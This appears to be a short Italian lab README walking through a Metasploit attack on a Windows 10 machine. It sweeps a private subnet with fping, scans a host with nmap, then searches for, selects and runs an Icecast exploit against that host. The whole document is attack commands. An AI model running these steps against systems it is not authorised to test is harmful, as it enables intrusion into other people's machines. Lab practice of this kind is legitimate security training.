## **MetasploitW10**
## **netscan**
```bash
fping -a -g 192.168.1.0/24
```
## **nmap**
```bash
nmap -sV -T5 192.168.1.149
```
➡️​[Risultato](https://github.com/OctavianIT/MetasploitW10/blob/main/MetasploitW10/foto2.png)

## **avvio**
```bash
msfconsole
```
## **exploit**
```bash
search type:exploit icecast
```
## **selezione**
```bash
use 0
```
## **config**
```bash
set RHOSTS 192.168.1.149
```
## **avvio**
```bash
exploit
```
➡️​[Risultato](https://github.com/OctavianIT/MetasploitW10/blob/main/MetasploitW10/foto7.png)
